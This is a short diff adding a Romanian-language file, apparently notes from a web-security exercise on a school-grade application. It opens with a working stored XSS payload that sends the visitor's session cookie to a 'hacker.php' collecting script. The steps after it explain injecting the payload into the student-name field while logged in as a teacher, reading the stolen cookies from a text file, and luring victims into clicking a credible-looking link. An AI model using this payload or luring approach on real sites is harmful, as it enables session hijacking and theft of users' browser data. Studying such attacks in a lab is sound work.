@@ -1,0 +1,9 @@
+"/> <script>window.open("http://localhost/hacker/hacker.php?cookie="+document.cookie);</script><!--
+----------------------------
+Ne logăm ca profesor
+Unde trebuie să scriem numele elevului, punem linia asta de cod. 
+Se va executa hacker.php și vom primi un nou xss_victim.txt care conține cookie-ul sesiunii. 
+(Deschide xss_victim.txt pentru a vedea link)
+Acum pot partaja link-ul obținut altora și, deoarece pare a fi un link de la un site credibil, 
+pot convinge victimele să facă clic pe el. 
+Făcând acest lucru, pot colecta datele browserului lor pe serverul meu de la distanță.
